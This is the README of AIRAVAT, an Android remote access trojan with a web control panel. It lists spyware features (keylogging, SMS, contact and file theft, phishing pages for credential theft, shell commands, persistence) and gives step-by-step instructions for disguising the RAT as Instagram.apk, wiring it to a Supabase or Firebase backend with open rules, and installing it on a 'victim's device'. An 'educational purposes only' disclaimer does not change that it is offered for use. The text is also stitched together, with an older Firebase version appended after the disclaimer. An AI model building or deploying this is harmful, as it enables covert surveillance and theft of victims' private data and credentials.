
<p align="center">
<img src='WEB PANEL/img/logo.png' style="height:100px;width:100px;" >
</p>
<h1 align=center>AIRAVAT</h1>

#### A multifunctional Android RAT with GUI based Web Panel without port forwarding.

> [!IMPORTANT]
> **🔄 MIGRATED TO SUPABASE**: This project has been migrated from Firebase to Supabase for better performance, cost efficiency, and modern database features. See [MIGRATION_GUIDE.md](MIGRATION_GUIDE.md) for detailed setup instructions.

> [!IMPORTANT]
> The source code has been published <a href="./ANDROID APP/AIRAVAT.swb" >here</a> use <a href="https://github.com/Sketchware-Pro/Sketchware-Pro" >Sketchware Pro</a> to view the source code.


<div align="center">

</div>

## Features
 - Read all the files of Internal Storage
 - Download Any Media to your Device from Victims Device
 - Get all the system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Send SMS
 - Gets all the Notifications 
 - Keylogger
 - Admin Permission 
 - Show Phishing Pages to steal credentials through notification.
    - Steal credentials through pre built phishing pages
    - Open any suspicious website through notification to steal credentials.
 - Record Audio through Mic
 - Play music in Victim's device
 - Vibrate Device
 - Text To Speech 
 - Turn On/Off Torch Light
 - Change Wallpaper
 - Run shell Commands
 - Get Clipboard text (Only When app's Activity is visible)
 - Launch Any URL (Only When app's Activity is visible)
 - Pre Binded with [Instagram Webview Phishing ](https://github.com/Th30neAnd0nly/PI)
 - Runs In Background 
    - Auto Starts on restarting the device
    - Auto Starts when any notification arrives
 - No port forwarding needed

<img align=center src=./.github/img.jpg >


## Requirements (Updated for Supabase)
 - Supabase Account (Free tier available)
 - Vercel Account (For hosting - Free tier available)
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)


## How to Build (Supabase Version)

> [!NOTE]
> **Quick Setup**: For detailed step-by-step instructions, see [MIGRATION_GUIDE.md](MIGRATION_GUIDE.md)

  ### Supabase Setup
 1. Create a Supabase Account at [supabase.com](https://supabase.com)
 1. Create a new project and note down your Project URL and API keys
 1. Execute the SQL schema from `supabase-schema.sql` in your Supabase SQL editor
 1. Configure Row Level Security (RLS) policies as needed
 
   ### Panel Setup (Vercel Deployment)
 1. Fork this repository or download the source code
 1. Update `WEB PANEL/index.html` with your Supabase configuration:
    ```javascript
    const supabaseConfig = {
      url: "https://your-project-id.supabase.co",
      key: "your-supabase-anon-key"
    };
    ```
 1. Deploy to Vercel:
    - Connect your GitHub repository to Vercel
    - Configure environment variables in Vercel dashboard
    - Deploy with one click
 1. Your panel will be available at `https://your-project.vercel.app`
 
 ### Android RAT (Updated)
 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
 1. Decompile it using APK modification tools
 1. Replace `res/values/strings.xml` with Supabase configuration:
    ```xml
    <string name="supabase_url">https://your-project-id.supabase.co</string>
    <string name="supabase_anon_key">your-supabase-anon-key</string>
    <string name="supabase_service_role_key">your-service-role-key</string>
    ```
 1. Replace Firebase code with Supabase implementation (see `ANDROID APP/SupabaseClient.java`)
 1. Recompile and sign the APK
 1. Install on target device with all required permissions

## Migration from Firebase

If you're upgrading from the original Firebase version:

1. **Backup your data**: Export any important data from Firebase
2. **Follow the migration guide**: See [MIGRATION_GUIDE.md](MIGRATION_GUIDE.md) for detailed steps
3. **Update all components**: Both web panel and Android APK need to be updated
4. **Test thoroughly**: Verify all features work with the new Supabase backend

## What's New in Supabase Version

✅ **Better Performance**: PostgreSQL database with optimized queries  
✅ **Real-time Updates**: WebSocket-based real-time subscriptions  
✅ **Cost Effective**: Generous free tier with better pricing  
✅ **Modern Stack**: Built on modern technologies  
✅ **Better Security**: Row Level Security (RLS) for data protection  
✅ **File Storage**: Integrated file storage with CDN  
✅ **Easy Deployment**: One-click deployment to Vercel  

## Tutorial Videos
  1. To be updated with Supabase migration...

### ❤️Supporters❤️
[![Stargazers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/stars/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/stargazers)

[![Forkers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/forks/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/network/members)

## Credits

**Original AIRAVAT Project**: [Th30neAnd0nly](https://github.com/Th30neAnd0nly)  
**Supabase Migration & Modernization**: [Bionic Sailor](https://github.com/bionic-sailor)

## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>

The use of the AIRAVAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).

> [!WARNING]
> This software is intended for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal and punishable by law. Users must comply with all applicable laws and regulations in their jurisdiction.
 - Firebase Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool M](https://maximoff.su/apktool/?lang=en) ( for Android)


## How to Build 
  ### Firebase Setup
 1. Create an Firebase Account and afterwords create a new project with any name.
 1. Enable Firebase Database and Firebase Storage.
 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
    - ```js
          {
           "rules": {
                   ".read": "true",
                   ".write": "true"
                    }
          }
      ```
 1. In Firebase Storage allow reads and writes for all paths.
    - ```js
        rules_version = '2';
        service firebase.storage {
        match /b/{bucket}/o {
            match /{allPaths=**} {
               allow read, write 
              }
          }
       }
      ```
 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
 1. Also create a web app and copy the config of webapp.
   ### Panel Setup
 1. You can use Github Pages , Firebase Hosting or any Hosting Website (except 000webhost) for hosting the panel.
 1. Open [index.html](./WEB%20PANEL/index.html) File and from [line number 16](https://github.com/Th30neAnd0nly/AIRAVAT/blob/325ff0befec72a55c273e99a0e06059db9d599fb/WEB%20PANEL/index.html#L16) replace the config with your web app config which you have created on Step 6.
 1. Save the file , Your Panel Setup is completed.
 ### Android RAT
 1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
  ### Tutorial Videos
  1. To be updated...

### ❤️Supporters❤️
[![Stargazers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/stars/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/stargazers)

[![Forkers repo roster for @th30neand0nly/AIRAVAT](http://reporoster.com/forks/dark/Th30neAnd0nly/AIRAVAT)](https://github.com/Th30neAnd0nly/AIRAVAT/network/members)



## DISCLAIMER
<p align="center">
 TO BE USED FOR EDUCATIONAL PURPOSES ONLY
</p>


The use of the AIRAVAT is COMPLETE RESPONSIBILITY of the END-USER. Developers assume NO liability and are NOT responsible for any misuse or damage caused by this program. Please read [LICENSE](LICENSE).








